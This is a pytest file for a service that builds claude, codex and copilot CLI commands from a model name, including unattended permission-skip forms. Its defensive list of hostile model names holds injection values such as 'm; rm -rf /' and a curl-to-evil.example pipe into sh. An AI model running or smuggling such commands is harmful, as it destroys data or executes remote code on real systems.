"""flowgate.default.0519 T0005/TR0001 — the model_name-driven CLI preset builder.

T0001 asked for ONE server-side place that knows what a claude/codex/copilot command line
looks like, so a magic-tool client can later turn `kind + model_name + permission state`
into a canonical `cli_command` without owning any CLI's flags itself. This covers the new
pieces that make that true:

  * `_CLI_PRESETS` / `build_preset_command()` — the preset templates and the function that
    fills them in, for both the safe and the permission-skip (unattended) form.
  * `_CLI_COMMAND_EXAMPLES` (what the settings screen suggests) is DERIVED from the same
    presets rather than a hand-written second copy — a preset fix reaches both.
  * `get_catalog()["cli_presets"]` — the metadata a client needs (default model, whether a
    permission-skip form exists) without it ever seeing a flag string.
  * Codex's unattended form is not "the safe form with one flag flipped": nobody is there to
    answer an approval prompt, so the sandbox itself widens from `workspace-write` to
    `danger-full-access` and the workspace-write-only `-c
    sandbox_workspace_write.network_access=true` token is dropped. That transformation lives
    only in the preset template, never in the generic marker toggle
    (`_PERMISSION_SKIP_RULES` / `set_permission_skip`, covered by
    test_ai_permission_default_0371.py) — this file is what actually proves the shape.
  * `custom` never gets a preset: it is the arbitrary-command escape hatch.
  * `cli_permission_skip.examples` is derived from the preset's own skip form too, so the
    published "permission checks off" codex example really is the danger-full-access one.
  * `model_name` is an identifier, not free text: the command built here ends up in a
    provider row that FlowGate spawns with shell=True, and the magic-tool UI fills the name
    in from a text box, so a hostile name is refused rather than interpolated.
"""
from __future__ import annotations

import os
import sys
from pathlib import Path

import pytest

os.environ["TESTING"] = "1"
os.environ.setdefault("SECRET_KEY", "test-secret-key-for-testing-only-32c")

_SERVER_DIR = Path(__file__).resolve().parents[1]
if str(_SERVER_DIR) not in sys.path:
    sys.path.insert(0, str(_SERVER_DIR))

from modules.flow_gate.settings import ai_settings_service as svc  # noqa: E402

HOST_KEYS = ("posix", "nt")
PRESET_KINDS = ("claude", "codex", "copilot")

# Every one of these would change the command, not just the model, if it were pasted into
# `--model {model}` and handed to a shell.
HOSTILE_MODEL_NAMES = [
    "m; rm -rf /",
    "m && curl http://evil.example/x | sh",
    "m | tee out.txt",
    "m `whoami`",
    "m $(whoami)",
    "m\nrm -rf /",
    "m\r\nwhoami",
    "m > out.txt",
    "m < in.txt",
    "m & start calc",
    'm" --dangerously-skip-permissions "x',
    "m' ; whoami ; '",
    "m --dangerously-skip-permissions",
    "m --allow-all",
    "m --sandbox danger-full-access",
    "m %USERPROFILE%",
    "m\ttab",
    "(m)",
    "m{a,b}",
    "m*",
]

VALID_MODEL_NAMES = [
    "claude-opus-4-8",
    "gpt-5.6-sol",
    "claude-sonnet-5",
    "anthropic/claude-sonnet-5",
    "us.anthropic.claude-v2:0",
    "gpt-5.6-sol@2026-01",
    "my_local_model",
]

SHELL_METACHARACTERS = ";|&$`<>\"'\n\r\t*?()[]{}"


# ── Claude ───────────────────────────────────────────────────────────────────

class TestClaudePreset:
    def test_model_name_is_substituted(self):
        out = svc.build_preset_command("claude", "claude-sonnet-5")
        assert out == "claude --model claude-sonnet-5 -p -"

    def test_safe_command_asks(self):
        out = svc.build_preset_command("claude", "m")
        assert not svc.has_permission_skip("claude", out)

    def test_permission_skip_command_does_not_ask(self):
        out = svc.build_preset_command("claude", "m", skip_permissions=True)
        assert out == "claude --model m --dangerously-skip-permissions -p -"
        assert svc.has_permission_skip("claude", out)

    def test_safe_and_skip_round_trip_through_the_same_model(self):
        safe = svc.build_preset_command("claude", "m")
        skip = svc.build_preset_command("claude", "m", skip_permissions=True)
        assert "--model m" in safe and "--model m" in skip
        assert safe != skip

    @pytest.mark.parametrize("blank", [None, "", "   "])
    def test_a_blank_model_falls_back_to_the_default(self, blank):
        assert svc.build_preset_command("claude", blank) == \
            svc.build_preset_command("claude", svc._CLI_PRESETS["claude"]["default_model"])


# ── Codex ────────────────────────────────────────────────────────────────────

class TestCodexPreset:
    def test_model_name_is_substituted(self):
        out = svc.build_preset_command("codex", "gpt-5.6-sol")
        assert "--model gpt-5.6-sol" in out

    def test_safe_command_shape(self):
        out = svc.build_preset_command("codex", "m")
        assert "--ask-for-approval on-request" in out
        assert "--sandbox workspace-write" in out
        assert svc.CODEX_SKIP_GIT_FLAG in out
        assert "--json" in out
        assert out.endswith("-")
        assert out.index("--ask-for-approval") < out.index("exec")

    def test_unattended_command_shape(self):
        out = svc.build_preset_command("codex", "m", skip_permissions=True)
        assert "--ask-for-approval never" in out
        assert "--sandbox danger-full-access" in out
        assert svc.CODEX_SKIP_GIT_FLAG in out
        assert "--json" in out
        assert out.endswith("-")
        assert out.index("--ask-for-approval") < out.index("exec")

    def test_unattended_command_drops_the_workspace_write_only_config_token(self):
        """`-c sandbox_workspace_write.network_access=true` only means something under
        `--sandbox workspace-write`; carrying it into `danger-full-access` would misdescribe
        the sandbox that is actually running."""
        out = svc.build_preset_command("codex", "m", skip_permissions=True)
        assert "sandbox_workspace_write.network_access" not in out
        safe = svc.build_preset_command("codex", "m")
        assert "sandbox_workspace_write.network_access" in safe

    def test_unattended_command_is_not_reachable_through_the_generic_toggle(self):
        """The sandbox switch is a preset-layer decision, not something
        set_permission_skip() (the settings-editor checkbox helper) does to an arbitrary
        stored command — see test_ai_permission_default_0371.py for that contract."""
        safe = svc.build_preset_command("codex", "m")
        toggled = svc.set_permission_skip("codex", safe, True)
        preset_skip = svc.build_preset_command("codex", "m", skip_permissions=True)
        assert toggled != preset_skip
        assert "--sandbox workspace-write" in toggled  # generic toggle leaves the sandbox alone

    def test_already_carries_the_flag_normalize_needs(self):
        for skip in (False, True):
            out = svc.build_preset_command("codex", "m", skip_permissions=skip)
            assert svc.normalize_cli_command("codex", out) == out

    def test_stdin_prompt_form_is_preserved(self):
        assert svc.build_preset_command("codex", "m").endswith(" -")
        assert svc.build_preset_command("codex", "m", skip_permissions=True).endswith(" -")


# ── Copilot ──────────────────────────────────────────────────────────────────

class TestCopilotPreset:
    def test_model_name_is_substituted(self):
        out = svc.build_preset_command("copilot", "claude-sonnet-5")
        assert "--model claude-sonnet-5" in out

    def test_safe_command_carries_no_ask_user_but_not_allow_all(self):
        out = svc.build_preset_command("copilot", "m")
        assert "--no-ask-user" in out
        assert "--allow-all" not in out
        assert "--output-format=json" in out

    def test_permission_skip_adds_allow_all_and_keeps_no_ask_user(self):
        out = svc.build_preset_command("copilot", "m", skip_permissions=True)
        assert "--allow-all" in out
        assert "--no-ask-user" in out
        assert "--output-format=json" in out

    def test_permission_off_has_no_allow_all(self):
        out = svc.build_preset_command("copilot", "m", skip_permissions=False)
        assert "--allow-all" not in out

    def test_no_prompt_flag_is_forced(self):
        """Copilot's prompt reaches it over FlowGate's existing subprocess stdin path, so
        neither form should invent a `-p`/prompt-taking flag the way claude's does."""
        for skip in (False, True):
            out = svc.build_preset_command("copilot", "m", skip_permissions=skip)
            assert " -p " not in f" {out} "
            assert not out.endswith(" -p")


# ── Catalog: custom excluded, no second command catalog, providers untouched ──

class TestPresetCatalog:
    def test_custom_has_no_preset(self):
        assert svc.build_preset_command("custom", "m") is None
        assert "custom" not in svc._CLI_PRESETS

    def test_unknown_kind_has_no_preset(self):
        assert svc.build_preset_command("does-not-exist", "m") is None
        assert svc.build_preset_command(None, "m") is None

    def test_catalog_exposes_preset_metadata_without_flags(self):
        presets = svc.get_catalog()["cli_presets"]
        assert set(presets) == {"claude", "codex", "copilot"}
        for kind in ("claude", "codex", "copilot"):
            assert presets[kind]["default_model"] == svc._CLI_PRESETS[kind]["default_model"]
            assert presets[kind]["supports_permission_skip"] is True
        assert "custom" not in presets

    @pytest.mark.parametrize("host_os", HOST_KEYS)
    @pytest.mark.parametrize("kind", ["claude", "codex", "copilot"])
    def test_cli_examples_are_the_preset_safe_form_not_a_second_catalog(self, kind, host_os):
        examples = svc.get_catalog()["cli_examples"]
        assert examples[kind][host_os] == svc.build_preset_command(kind, None)

    def test_custom_example_is_still_the_empty_escape_hatch(self):
        examples = svc.get_catalog()["cli_examples"]
        assert examples["custom"]["posix"] == ""
        assert examples["custom"]["nt"] == ""

    def test_a_stored_row_is_unaffected_by_the_preset_catalog(self):
        """A provider's cli_command is read from the DB row, never rebuilt from the
        catalog on the way out — changing (or even removing) a preset must not alter what
        an already-registered provider spawns."""
        stored = "claude --dangerously-skip-permissions -p -"
        assert stored not in svc.get_catalog()["cli_examples"]["claude"].values()
        assert svc.normalize_cli_command("claude", stored) == stored

    @pytest.mark.parametrize("host_os", HOST_KEYS)
    @pytest.mark.parametrize("kind", PRESET_KINDS)
    def test_permission_examples_are_the_preset_skip_form(self, kind, host_os):
        """The catalog's "permission checks off" example is derived from the preset's own
        skip_template, not from running the generic marker toggle over the safe example —
        otherwise the published codex command would carry `--ask-for-approval never` while
        still claiming `--sandbox workspace-write`."""
        examples = svc.get_catalog()["cli_permission_skip"]["examples"]
        assert examples[kind][host_os] == \
            svc.build_preset_command(kind, None, skip_permissions=True)

    @pytest.mark.parametrize("host_os", HOST_KEYS)
    def test_the_published_codex_unattended_example_is_the_canonical_one(self, host_os):
        example = svc.get_catalog()["cli_permission_skip"]["examples"]["codex"][host_os]
        assert "--ask-for-approval never" in example
        assert "--sandbox danger-full-access" in example
        assert "workspace-write" not in example
        assert "sandbox_workspace_write.network_access" not in example


# ── model_name is an identifier, not free text ───────────────────────────────

class TestModelNameIsValidated:
    """The built command becomes a provider's cli_command, which FlowGate spawns through a
    shell, and the follow-up magic-tool UI supplies model_name from a text box. So a name
    carrying whitespace or a shell operator has to be refused at the builder, not escaped —
    one catalog serves both POSIX shells and cmd.exe, whose quoting rules disagree."""

    @pytest.mark.parametrize("model", HOSTILE_MODEL_NAMES)
    def test_a_hostile_name_is_not_a_model_name(self, model):
        assert svc.is_valid_model_name(model) is False

    @pytest.mark.parametrize("skip", [False, True])
    @pytest.mark.parametrize("kind", PRESET_KINDS)
    @pytest.mark.parametrize("model", HOSTILE_MODEL_NAMES)
    def test_a_hostile_name_is_refused_instead_of_interpolated(self, model, kind, skip):
        with pytest.raises(svc.AiSettingsValidationError) as caught:
            svc.build_preset_command(kind, model, skip_permissions=skip)
        assert caught.value.errors == [
            {"field": "model_name", "reason": "invalid_model_name"},
        ]

    @pytest.mark.parametrize("model", HOSTILE_MODEL_NAMES)
    def test_no_command_string_is_produced_for_a_hostile_name(self, model):
        """The refusal must not be "returns None" — None already means "no preset for this
        kind", and a caller reading it that way would silently drop the injection instead of
        reporting it."""
        try:
            out = svc.build_preset_command("claude", model)
        except svc.AiSettingsValidationError:
            return
        pytest.fail(f"built a command from a hostile model name: {out!r}")

    @pytest.mark.parametrize("skip", [False, True])
    @pytest.mark.parametrize("kind", PRESET_KINDS)
    @pytest.mark.parametrize("model", VALID_MODEL_NAMES)
    def test_a_real_model_id_still_goes_through(self, model, kind, skip):
        assert svc.is_valid_model_name(model) is True
        out = svc.build_preset_command(kind, model, skip_permissions=skip)
        assert f"--model {model}" in out

    @pytest.mark.parametrize("skip", [False, True])
    @pytest.mark.parametrize("kind", PRESET_KINDS)
    @pytest.mark.parametrize("model", VALID_MODEL_NAMES)
    def test_a_built_command_carries_no_shell_operator(self, model, kind, skip):
        out = svc.build_preset_command(kind, model, skip_permissions=skip)
        for char in SHELL_METACHARACTERS:
            assert char not in out

    def test_an_over_long_name_is_refused(self):
        assert svc.is_valid_model_name("m" * svc.MODEL_NAME_MAX) is True
        assert svc.is_valid_model_name("m" * (svc.MODEL_NAME_MAX + 1)) is False
        with pytest.raises(svc.AiSettingsValidationError):
            svc.build_preset_command("claude", "m" * (svc.MODEL_NAME_MAX + 1))

    @pytest.mark.parametrize("blank", [None, "", "   ", "\t"])
    def test_a_blank_name_is_the_default_not_a_refusal(self, blank):
        """Blank means "the caller did not choose", which the preset answers with its own
        default_model — only a name that IS something unusable is an error."""
        assert svc.build_preset_command("claude", blank) is not None

    @pytest.mark.parametrize("kind", PRESET_KINDS)
    def test_every_preset_default_model_is_itself_a_valid_identifier(self, kind):
        assert svc.is_valid_model_name(svc._CLI_PRESETS[kind]["default_model"]) is True

    @pytest.mark.parametrize("kind", ["custom", "does-not-exist", None])
    def test_a_kind_with_no_preset_builds_nothing_hostile_name_or_not(self, kind):
        """No preset means no command at all, so there is nothing to inject into — the
        missing preset is still reported as None rather than as a validation error."""
        assert svc.build_preset_command(kind, "m; rm -rf /") is None
